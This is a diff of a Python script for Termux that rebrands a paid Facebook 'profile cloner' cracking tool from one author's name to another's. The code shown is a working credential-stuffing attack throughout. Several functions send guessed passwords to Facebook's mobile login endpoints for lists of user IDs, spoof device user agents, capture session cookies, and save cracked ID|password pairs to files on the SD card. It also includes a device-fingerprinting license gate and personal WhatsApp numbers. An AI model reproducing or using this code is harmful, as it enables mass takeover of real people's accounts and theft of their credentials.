@@ -60,13 +60,14 @@ for x in range(10000):
 	uakua=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
 	useragent.append(uakua)
 #menu_apikey()
+
 logo=(f"""\x1b[1;94m╔═════════════════════════════════════════════════════╗
 \x1b[1;94m║                                                     ║
-\x1b[1;94m║  \x1b[1;92m  ██   ██ \033[1;33m██   ██ \x1b[1;91m █████  \x1b[1;94m██	 \x1b[1;96m    ██ \x1b[1;95m██████    \x1b[1;94m    ║
-\x1b[1;94m║  \x1b[1;92m  ██  ██  \033[1;33m██   ██ \x1b[1;91m██   ██ \x1b[1;94m██	 \x1b[1;96m    ██ \x1b[1;95m██   ██  \x1b[1;94m     ║
-\x1b[1;94m║  \x1b[1;92m  █████   \033[1;33m███████ \x1b[1;91m███████ \x1b[1;94m██	 \x1b[1;96m    ██ \x1b[1;95m██   ██   \x1b[1;94m    ║
-\x1b[1;94m║  \x1b[1;92m  ██  ██  \033[1;33m██   ██ \x1b[1;91m██   ██ \x1b[1;94m██	 \x1b[1;96m    ██ \x1b[1;95m██   ██  \x1b[1;94m     ║
-\x1b[1;94m║  \x1b[1;92m  ██   ██ \033[1;33m██   ██ \x1b[1;91m██   ██ \x1b[1;94m███████ \x1b[1;96m██ \x1b[1;95m██████   \x1b[1;94m     ║
+\x1b[1;94m║  \x1b[1;92m██████  \x1b[1;33m███    ██       \x1b[1;91m███████ \x1b[1;94m██ \x1b[1;96m██████  \x1b[1;95m███████\x1b[1;94m ║
+\x1b[1;94m║ \x1b[1;92m██    ██ \x1b[1;33m████   ██       \x1b[1;91m██      \x1b[1;94m██ \x1b[1;96m██   ██ \x1b[1;95m██\x1b[1;94m      ║
+\x1b[1;94m║ \x1b[1;92m██    ██ \x1b[1;33m██ ██  ██ \x1b[1;92m█████ \x1b[1;91m█████   \x1b[1;94m██ \x1b[1;96m██████  \x1b[1;95m█████\x1b[1;94m   ║
+\x1b[1;94m║ \x1b[1;92m██    ██ \x1b[1;33m██  ██ ██       \x1b[1;91m██      \x1b[1;94m██ \x1b[1;96m██   ██ \x1b[1;95m██\x1b[1;94m      ║
+\x1b[1;94m║  \x1b[1;92m██████  \x1b[1;33m██   ████       \x1b[1;91m██      \x1b[1;94m██ \x1b[1;96m██   ██ \x1b[1;95m███████\x1b[1;94m ║
 \x1b[1;94m║                                                     ║
 \x1b[1;94m╚═════════════════════════════════════════════════════╝
 
@@ -75,14 +76,15 @@ logo=(f"""\x1b[1;94m╔═══════════════════
 \x1b[1;94m╚═════════════════════════════════════════════════════╝
 
 \x1b[1;94m╔═════════════════════════════════════════════════════╗
-\x1b[1;94m║\x1b[1;92m[\x1b[1;91m✔\x1b[1;92m] DEVELOPER      :        KHALID SHAIFULLAH        \x1b[1;94m║
-\x1b[1;94m║\x1b[1;92m[\x1b[1;91m✔\x1b[1;92m] FACEBOOK       :        KHALID SHAIFULLAHツ      \x1b[1;94m║
-\x1b[1;94m║\x1b[1;92m[\x1b[1;91m✔\x1b[1;92m] WHATSAPP       :        +8801798396843           \x1b[1;94m║
-\x1b[1;94m║\x1b[1;92m[\x1b[1;91m✔\x1b[1;92m] GITHUB         :        KHALID-404 	      \x1b[1;94m║
-\x1b[1;94m║\x1b[1;92m[\x1b[1;91m✔\x1b[1;92m] YOUTUBE        :        KHALID TECH BD           \x1b[1;94m║
+\x1b[1;94m║\x1b[1;92m[\x1b[1;91m✔\x1b[1;92m] DEVELOPER      :        ACTION-FIRE              \x1b[1;94m║
+\x1b[1;94m║\x1b[1;92m[\x1b[1;91m✔\x1b[1;92m] FACEBOOK       :        FT ALVI                 \x1b[1;94m║
+\x1b[1;94m║\x1b[1;92m[\x1b[1;91m✔\x1b[1;92m] WHATSAPP       :        +9660507886505           \x1b[1;94m║
+\x1b[1;94m║\x1b[1;92m[\x1b[1;91m✔\x1b[1;92m] GITHUB         :        ACTION-FIRE 	      \x1b[1;94m║
+\x1b[1;94m║\x1b[1;92m[\x1b[1;91m✔\x1b[1;92m] YOUTUBE        :        ON-FIRE                  \x1b[1;94m║
 \x1b[1;94m║\x1b[1;92m[\x1b[1;91m✔\x1b[1;92m] TOOLS          :        PRO-FILE CLONER          \x1b[1;94m║
 \x1b[1;94m║\x1b[1;92m[\x1b[1;91m✔\x1b[1;92m] STATUS         :        PAID                     \x1b[1;94m║
-\x1b[1;94m║\x1b[1;92m[\x1b[1;91m✔\x1b[1;92m] VERSION        :        0.0.1                    \x1b[1;94m║
+\x1b[1;94m║\x1b[1;92m[\x1b[1;91m✔\x1b[1;92m] VERSION        :        1.0.3.PRO                \x1b[1;94m║
+\x1b[1;94m║\x1b[1;92m[\x1b[1;91m✔\x1b[1;92m] Network        :        3G, 4G/5G, ON            \x1b[1;94m║
 \x1b[1;94m╚═════════════════════════════════════════════════════╝
 """)
 
@@ -127,22 +129,22 @@ else:
     pass
 os.system("rm -rf .f1")
 os.system("rm -rf .f2")
-update = requests.get("https://raw.githubusercontent.com/KHALID-404/KHALID-404/main/approval.txt").text
+update = requests.get("https://raw.githubusercontent.com/ACTION-FIRE/main/approval.txt").text
 uuidd = str(os.geteuid()) + str(os.getlogin()) + str(os.getuid())
 id = "".join(uuidd).replace("_","").replace("360","AHS").replace("u","9").replace("a","A")
 plat = platform.version()[14:][:21][::-1].upper()+platform.release()[5:][::-1].upper()+platform.version()[:8]
 xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
 bxd = ""
-bumper = "KHALID=="+id+bxd+xp
-KHALID = "KHALID-404"
+bumper = "FIRE=="+id+bxd+xp
+FIRE   = "ACTION-FIRE"
 myweb2 = requests.get(f"https://raw.githubusercontent.com/{KHALID}/KHALID-404/main/apprval.txt").text
-logo1 = ("""\x1b[1;94m╔═════════════════════════════════════════════════════╗
+logo1 = ("""\x1b[1;94m═════════════════════════════════════════════════════╗
 \x1b[1;94m║                                                     ║
-\x1b[1;94m║  \x1b[1;92m  ██   ██ \033[1;33m██   ██ \x1b[1;91m █████  \x1b[1;94m██	 \x1b[1;96m    ██ \x1b[1;95m██████    \x1b[1;94m    ║
-\x1b[1;94m║  \x1b[1;92m  ██  ██  \033[1;33m██   ██ \x1b[1;91m██   ██ \x1b[1;94m██	 \x1b[1;96m    ██ \x1b[1;95m██   ██  \x1b[1;94m     ║
-\x1b[1;94m║  \x1b[1;92m  █████   \033[1;33m███████ \x1b[1;91m███████ \x1b[1;94m██	 \x1b[1;96m    ██ \x1b[1;95m██   ██   \x1b[1;94m    ║
-\x1b[1;94m║  \x1b[1;92m  ██  ██  \033[1;33m██   ██ \x1b[1;91m██   ██ \x1b[1;94m██	 \x1b[1;96m    ██ \x1b[1;95m██   ██  \x1b[1;94m     ║
-\x1b[1;94m║  \x1b[1;92m  ██   ██ \033[1;33m██   ██ \x1b[1;91m██   ██ \x1b[1;94m███████ \x1b[1;96m██ \x1b[1;95m██████   \x1b[1;94m     ║
+\x1b[1;94m║  \x1b[1;92m██████  \x1b[1;33m███    ██       \x1b[1;91m███████ \x1b[1;94m██ \x1b[1;96m██████  \x1b[1;95m███████\x1b[1;94m ║
+\x1b[1;94m║ \x1b[1;92m██    ██ \x1b[1;33m████   ██       \x1b[1;91m██      \x1b[1;94m██ \x1b[1;96m██   ██ \x1b[1;95m██\x1b[1;94m      ║
+\x1b[1;94m║ \x1b[1;92m██    ██ \x1b[1;33m██ ██  ██ \x1b[1;92m█████ \x1b[1;91m█████   \x1b[1;94m██ \x1b[1;96m██████  \x1b[1;95m█████\x1b[1;94m   ║
+\x1b[1;94m║ \x1b[1;92m██    ██ \x1b[1;33m██  ██ ██       \x1b[1;91m██      \x1b[1;94m██ \x1b[1;96m██   ██ \x1b[1;95m██\x1b[1;94m      ║
+\x1b[1;94m║  \x1b[1;92m██████  \x1b[1;33m██   ████       \x1b[1;91m██      \x1b[1;94m██ \x1b[1;96m██   ██ \x1b[1;95m███████\x1b[1;94m ║
 \x1b[1;94m║                                                     ║
 \x1b[1;94m╚═════════════════════════════════════════════════════╝
 """)
@@ -161,20 +163,20 @@ def approval():
             exit('DONT TRY TO BYPASS')
         elif bumper in myweb2:
             print("YOUR KEY WAS APPROVED")
-            KHALID()
+            FIRE()
         else:
             os.system("clear");print(logo)
             print(f"{RED}YOUR DEVICE LICENSE KEY IS NOT APPROVED")
             print(55*"\033[1;92m=")
             print(f"\033[1;92m\033[1;91m[\033[1;92m•\033[1;91m]KEY : {RED}{bumper}")
             print(55*"\033[1;92m=")
-            print(f"{GREEN}7-DAYS PRICE : 200 TK ")
-            print(f"{GREEN}15-DAYS PRICE : 350 TK ")
-            print(f"{GREEN}1-MONTH PRICE : 500 TK")
+            print(f"{GREEN}7-DAYS PRICE  : 350 TK ")
+            print(f"{GREEN}15-DAYS PRICE : 500 TK ")
+            print(f"{GREEN}1-MONTH PRICE : 1000 TK")
             print(f"{BLUE}FREE APPROVAL AVAILABLE CONTACT ME ON MY WHATSAPP TO GET FREE APPROVAL")
             print(55*"\033[1;92m=")
             input("\033[1;91m[PRESS ENTER TO SEND KEY TO ADMIN]")
-            os.system(f"termux-open-url https://wa.me/+8801798396843?text={bumper}")
+            os.system(f"termux-open-url https://wa.me/+9660507886506?text={bumper}")
             approval()
     except requests.exceptions.ConnectionError:
         exit(' NO INTERNET CONNECTION ..')
@@ -187,7 +189,7 @@ def rrrr():
 def xchker():
     pass
     approval()
-def KHALID():
+def FIRE():
 	clear()
 	#ckx()
 	print(f"\033[1;91m[\033[1;92m1\033[1;91m]\033[1;92m FILE CLONING [SUPER SPEED] ")
@@ -197,11 +199,11 @@ def KHALID():
 	print(f"\033[1;91m[\033[1;92m5\033[1;91m]\033[1;91m EXIT")
 	me=input(f'\n\033[1;91m[\033[1;92m•\033[1;91m]\033[1;32m CHOOSE : ')
 	if me in ["2", "02"]:
-		os.system('xdg-open https://facebook.com/KHALID.CYBER.404')
+		os.system('xdg-open https://www.facebook.com/𝘼𝘾𝙏𝙄𝙊𝙉-𝙁𝙄𝙍𝙀-107968471946247/')
 	if me in ["3","03"]:
-		os.system('xdg-open https://github.com/KHALID-404')
+		os.system('xdg-open https://github.com/ACTION-FIRE')
 	if me in ["4","04"]:
-		os.system('xdg-open https://youtube.com/@Khalid_Vau')
+		os.system('xdg-open https://youtube.com/@ON-FIRE')
 	if me in ["5","05"]:
 		os.system("clear")
 	if me in ["1", "01","11","A","a"]:
@@ -238,7 +240,7 @@ def KHALID():
 			print(55*'\033[1;95m=')
 			print(f' TOTAL ACCOUNTS : \033[1;32m'+total_ids)
 			print(" USE 100089/100090 IDS FILE FOR OK IDS")
-			print(" OK IDS ARE SAVED IN : /SDCARD/KHALID-OK.TXT")
+			print(" OK IDS ARE SAVED IN : /SDCARD/FIRE-OK.TXT")
 			linex()
 			for user in fo:
 				ids,names = user.split(f'|')
@@ -263,7 +265,7 @@ def KHALID():
 					crack_submit.submit(api1,ids,names,passlist)
 def ffb(ids,names,passlist):
     global loop,oks,cps
-    sys.stdout.write(f'\r\r\033[1;37m [𝙺𝙷𝙰𝙻𝙸𝙳-𝙲𝚁𝙰𝙲𝙺𝙸𝙽𝙶] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+    sys.stdout.write(f'\r\r\033[1;37m [FIRE-CRACKING] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
     session = requests.Session()
     try:
         first = names.split(f' ')[0]
@@ -280,20 +282,20 @@ def ffb(ids,names,passlist):
             getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
             idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
             complete = session.post(f'https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
-            Khalid=session.cookies.get_dict().keys()
-            if "c_user" in Khalid:
+            FIRE=session.cookies.get_dict().keys()
+            if "c_user" in FIRE:
                 coki=session.cookies.get_dict()
                 kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-                print(f'\r\r\033[1;32m[KHALID-OK] %s | %s'%(ids,pas))
+                print(f'\r\r\033[1;32m[FIRE-OK] %s | %s'%(ids,pas))
                 print("\033[1;35m[‎‎💥]\033[1;32mCOOKIE = \033[1;34m"+kuki)
-                open(f'/sdcard/KHALID-OK.txt', 'a').write(ids+'|'+pas+'\n')
+                open(f'/sdcard/FIRE-OK.txt', 'a').write(ids+'|'+pas+'\n')
                 #cek_apk(session,coki)
                 oks.append(ids)
                 break
-            elif 'checkpoint' in Khalid:
+            elif 'checkpoint' in FIRE:
                 if 'y' in pcp:
-                    print(f'\r\r\033[1;90m[KHALID-CP] '+ids+' | '+pas+'\033[1;97m')
-                    open(f'/sdcard/KHALID-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                    print(f'\r\r\033[1;90m[FIRE-CP] '+ids+' | '+pas+'\033[1;97m')
+                    open(f'/sdcard/FIRE-CP.txt', 'a').write(ids+'|'+pas+'\n')
                     cps.append(ids)
                     break
                 else:
@@ -307,7 +309,7 @@ xxxxx=(f"GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","G
 #
 def ffb1(ids,names,passlist):
     global loop,oks,cps
-    sys.stdout.write(f'\r\r\033[1;37m [𝙺𝙷𝙰𝙻𝙸𝙳-𝙲𝚁𝙰𝙲𝙺𝙸𝙽𝙶] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+    sys.stdout.write(f'\r\r\033[1;37m [FIRE-CRACKING] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
     session = requests.Session()
     try:
         first = names.split(f' ')[0]
@@ -324,19 +326,19 @@ def ffb1(ids,names,passlist):
             getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
             idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
             complete = session.post(f'https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
-            Khalid=session.cookies.get_dict().keys()
-            if "c_user" in Khalid:
+            FIRE=session.cookies.get_dict().keys()
+            if "c_user" in FIRE:
                 coki=session.cookies.get_dict()
                 kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-                print(f'\r\r\033[1;32m[KHALID-OK] %s | %s'%(ids,pas))
+                print(f'\r\r\033[1;32m[FIRE-OK] %s | %s'%(ids,pas))
                 print("\033[1;35m[‎‎💥]\033[1;32mCOOKIE = \033[1;34m"+kuki)
-                open(f'/sdcard/KHALID-OK.txt', 'a').write(ids+'|'+pas+'\n')
+                open(f'/sdcard/FIRE-OK.txt', 'a').write(ids+'|'+pas+'\n')
                 oks.append(ids)
                 break
-            elif 'checkpoint' in Khalid:
+            elif 'checkpoint' in FIRE:
                 if 'y' in pcp:
-                    print(f'\r\r\x1b[1;90m [KHALID-CP] '+ids+' | '+pas+'\033[1;97m')
-                    open(f'/sdcard/KHALID-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                    print(f'\r\r\x1b[1;90m[FIRE-CP] '+ids+' | '+pas+'\033[1;97m')
+                    open(f'/sdcard/FIRE-CP.txt', 'a').write(ids+'|'+pas+'\n')
                     cps.append(ids)
                     break
                 else:
@@ -348,7 +350,7 @@ def ffb1(ids,names,passlist):
     loop+=1
 def ffb3(ids,names,passlist):
     global loop,oks,cps
-    sys.stdout.write(f'\r\r\033[1;37m [𝙺𝙷𝙰𝙻𝙸𝙳-𝙲𝚁𝙰𝙲𝙺𝙸𝙽𝙶] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+    sys.stdout.write(f'\r\r\033[1;37m [FIRE-CRACKING] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
     session = requests.Session()
     try:
         first = names.split(f' ')[0]
@@ -365,19 +367,19 @@ def ffb3(ids,names,passlist):
             getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
             idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
             complete = session.post(f'https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
-            Khalid=session.cookies.get_dict().keys()
-            if "c_user" in Khalid:
+            FIRE=session.cookies.get_dict().keys()
+            if "c_user" in FIRE:
                 coki=session.cookies.get_dict()
                 kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-                print(f'\r\r\033[1;32m [KHALID-OK] %s | %s'%(ids,pas))
-                open(f'/sdcard/KHALID-OK.txt', 'a').write(ids+'|'+pas+'\n')
+                print(f'\r\r\033[1;32m [FIRE-OK] %s | %s'%(ids,pas))
+                open(f'/sdcard/FIRE-OK.txt', 'a').write(ids+'|'+pas+'\n')
                 print("\033[1;35m[‎‎💥]\033[1;32mCOOKIE = \033[1;34m"+kuki)
                 oks.append(ids)
                 break
-            elif 'checkpoint' in Khalid:
+            elif 'checkpoint' in FIRE:
                 if 'y' in pcp:
-                    print(f'\r\r\x1b[1;90m [KHALID-CP] '+ids+' | '+pas+'\033[1;97m')
-                    open(f'/sdcard/KHALID-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                    print(f'\r\r\x1b[1;90m [FIRE-CP] '+ids+' | '+pas+'\033[1;97m')
+                    open(f'/sdcard/FIRE-CP.txt', 'a').write(ids+'|'+pas+'\n')
                     cps.append(ids)
                     break
                 else:
@@ -390,7 +392,7 @@ def ffb3(ids,names,passlist):
 xxxxx=(f"GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
 def ffb4(ids,names,passlist):
     global loop,oks,cps
-    sys.stdout.write(f'\r\r\033[1;37m [𝙺𝙷𝙰𝙻𝙸𝙳-𝙲𝚁𝙰𝙲𝙺𝙸𝙽𝙶] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+    sys.stdout.write(f'\r\r\033[1;37m [FIRE-CRACKING] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
     session = requests.Session()
     try:
         first = names.split(f' ')[0]
@@ -407,19 +409,19 @@ def ffb4(ids,names,passlist):
             getlog = session.get(f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
             idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
             complete = session.post(f'https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
-            Khalid=session.cookies.get_dict().keys()
-            if "c_user" in Khalid:
+            FIRE=session.cookies.get_dict().keys()
+            if "c_user" in FIRE:
                 coki=session.cookies.get_dict()
                 kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-                print(f'\r\r\033[1;32m [KHALID-OK] %s | %s'%(ids,pas))
-                open(f'/sdcard/KHALID-OK.txt', 'a').write(ids+'|'+pas+'\n')
+                print(f'\r\r\033[1;32m [FIRE-OK] %s | %s'%(ids,pas))
+                open(f'/sdcard/FIRE-OK.txt', 'a').write(ids+'|'+pas+'\n')
                 print("\033[1;35m[‎‎💥]\033[1;32mCOOKIE = \033[1;34m"+kuki)
                 oks.append(ids)
                 break
-            elif 'checkpoint' in Khalid:
+            elif 'checkpoint' in FIRE:
                 if 'y' in pcp:
-                    print(f'\r\r\x1b[1;90m [KHALID-CP] '+ids+' | '+pas+'\033[1;97m')
-                    open(f'/sdcard/KHALID-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                    print(f'\r\r\x1b[1;90m [FIRE-CP] '+ids+' | '+pas+'\033[1;97m')
+                    open(f'/sdcard/FIRE-CP.txt', 'a').write(ids+'|'+pas+'\n')
                     cps.append(ids)
                     break
                 else:
@@ -434,7 +436,7 @@ xxxxx=(f"GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","G
 def api(ids,names,passlist):
         try:
             global ok,loop
-            sys.stdout.write(f'\r\r\033[1;37m [𝙺𝙷𝙰𝙻𝙸𝙳-𝙲𝚁𝙰𝙲𝙺𝙸𝙽𝙶] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+            sys.stdout.write(f'\r\r\033[1;37m [FIRE-CRACKING] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
             fn = names.split(f' ')[0]
             try:
                 ln = names.split(f' ')[1]
@@ -484,15 +486,15 @@ def api(ids,names,passlist):
                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                 q = json.loads(po)
                 if 'session_key' in q:
-                    print(f'\r\r\033[1;32m [KHALID-OK] '+ids+' | '+pas+'\033[1;97m')
-                    open(f'/sdcard/KHALID-OK.txt','a').write(ids+'|'+pas+'\n')
+                    print(f'\r\r\033[1;32m [FIRE-OK] '+ids+' | '+pas+'\033[1;97m')
+                    open(f'/sdcard/FIRE-OK.txt','a').write(ids+'|'+pas+'\n')
                     #cek_apk(session,coki)
                     oks.append(ids)
                     break
                 elif 'www.facebook.com' in q['error_msg']:
                     if 'y' in pcp:
-                        print(f'\r\r\x1b[1;90m [KHALID-CP] '+ids+' | '+pas+'\033[1;97m')
-                        open(f'/sdcard/KHALID-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                        print(f'\r\r\x1b[1;90m [FIRE-CP] '+ids+' | '+pas+'\033[1;97m')
+                        open(f'/sdcard/FIRE-CP.txt', 'a').write(ids+'|'+pas+'\n')
                         cps.append(ids)
                         break
                 else:
@@ -505,7 +507,7 @@ def api(ids,names,passlist):
 def api1(ids,names,passlist):
         try:
             global ok,loop
-            sys.stdout.write(f'\r\r\033[1;37m [𝙺𝙷𝙰𝙻𝙸𝙳-𝙲𝚁𝙰𝙲𝙺𝙸𝙽𝙶] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+            sys.stdout.write(f'\r\r\033[1;37m [FIRE-CRACKING] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
             fn = names.split(f' ')[0]
             try:
                 ln = names.split(f' ')[1]
@@ -555,19 +557,19 @@ def api1(ids,names,passlist):
                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                 q = json.loads(po)
                 if 'session_key' in q:
-                    print(f'\r\r\033[1;32m [KHALID-OK] '+ids+' | '+pas+'\033[1;97m')
-                    open(f'/sdcard/KHALID-OK.txt','a').write(ids+'|'+pas+'\n')
+                    print(f'\r\r\033[1;32m [FIRE-OK] '+ids+' | '+pas+'\033[1;97m')
+                    open(f'/sdcard/FIRE-OK.txt','a').write(ids+'|'+pas+'\n')
                     #cek_apk(session,coki)
                     oks.append(ids)
                     break
                 elif 'www.facebook.com' in q['error']['message']:
                     if 'y' in pcp:
-                        print(f'\r\r\x1b[1;90m [KHALID-CP] '+ids+' | '+pas+'\033[1;97m')
-                        open(f'/sdcard/KHALID-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                        print(f'\r\r\x1b[1;90m [FIRE-CP] '+ids+' | '+pas+'\033[1;97m')
+                        open(f'/sdcard/FIRE-CP.txt', 'a').write(ids+'|'+pas+'\n')
                         cps.append(ids)
                         break
                     else:
-                        open(f'/sdcard/KHALID-CP.txt','a').write(ids+'|'+pas+'\n')
+                        open(f'/sdcard/FIRE-CP.txt','a').write(ids+'|'+pas+'\n')
                         break
                 else:
                     continue
@@ -578,7 +580,7 @@ def api1(ids,names,passlist):
             pass
 def ffb7(ids,names,passlist):
     global loop,oks,cps
-    sys.stdout.write(f'\r\r\033[1;37m [𝙺𝙷𝙰𝙻𝙸𝙳-𝙲??𝙰𝙲𝙺𝙸𝙽𝙶] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+    sys.stdout.write(f'\r\r\033[1;37m [FIRE-CRACKING] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
     session = requests.Session()
     try:
         first = names.split(f' ')[0]
@@ -595,19 +597,19 @@ def ffb7(ids,names,passlist):
             getlog = session.get(f'https://mobile.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
             idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
             complete = session.post(f'https://mobile.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
-            Khalid=session.cookies.get_dict().keys()
-            if "c_user" in Khalid:
+            FIRE=session.cookies.get_dict().keys()
+            if "c_user" in FIRE:
                 coki=session.cookies.get_dict()
                 kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-                print(f'\r\r\033[1;32m [KHALID-OK] %s | %s'%(ids,pas))
-                open(f'/sdcard/KHALID-OK.txt', 'a').write(ids+'|'+pas+'\n')
